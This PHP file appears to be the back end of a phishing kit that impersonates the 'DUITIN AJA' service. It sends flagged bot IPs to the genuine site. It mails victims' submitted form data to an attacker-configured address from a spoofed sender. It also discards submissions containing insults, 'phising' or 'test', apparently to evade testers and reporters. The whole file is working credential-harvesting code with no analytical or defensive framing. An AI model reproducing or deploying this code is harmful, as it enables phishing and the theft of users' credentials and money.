<?php
require_once('main.php');
if (preg_match("/".$ip."/i", file_get_contents('bot.txt'))) {
   exit(header("location:https://www.duitinaja.com/"));
}

if (isset($_POST['a']) && isset($_POST['b'])) {
   $subject = $_POST['a'];
   $message = str_replace('\r', "", $_POST['b']);
   $message = str_replace('\n', "", $message);
   $message_telegram = str_replace("<br>", "\n", $message);
   if (preg_match("/kontol/i", $subject) OR preg_match("/memek/i", $subject) OR preg_match("/anjing/i", $subject) OR preg_match("/pepek/i", $subject) OR preg_match("/kimak/i", $subject) OR preg_match("/pantek/i", $subject) OR preg_match("/nguyen/i", $subject) OR preg_match("/jembut/i", $subject) OR preg_match("/tolol/i", $subject) OR preg_match("/phising/i", $subject) OR preg_match("/bacot/i", $subject) OR preg_match("/babi/i", $subject) OR preg_match("/asucok/i", $subject) OR preg_match("/ngetes/i", $subject) OR preg_match("/test/i", $subject) OR preg_match("/testing/i", $subject)) {
      exit(header("location:https://www.duitinaja.com/"));
   }else{
      $headers  = 'MIME-Version: 1.0' . "\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
      $headers .= 'FROM: DUITIN AJA <admin@spm55-v3.vip>' . "\r\n";
      mail($email_result, $subject, $message, $headers);
   }
}else{
   tulis_file("bot.txt", $ip);
   exit(header("location:https://www.duitinaja.com/"));
}
?>